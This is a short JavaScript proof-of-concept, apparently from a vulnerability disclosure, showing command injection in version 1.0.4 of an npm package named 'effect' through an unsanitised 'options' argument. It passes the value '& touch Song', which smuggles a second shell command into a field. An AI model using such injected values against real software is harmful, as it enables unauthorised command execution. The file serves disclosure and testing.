  /**
   * effect@1.0.4 is vulnerable to command injection.
   * the injection point is located in line 24 of file "helper.js" in function executeCommand().
   * "helper.js" is required by the index file of this package (i.e.,"index.js").
   * the argument "options" can be controlled by users without any sanitization.
   */
  
  var Root= require("effect");
  var options  = {
  image: "& touch Song"
  }
  Root.edge(options, function(){});

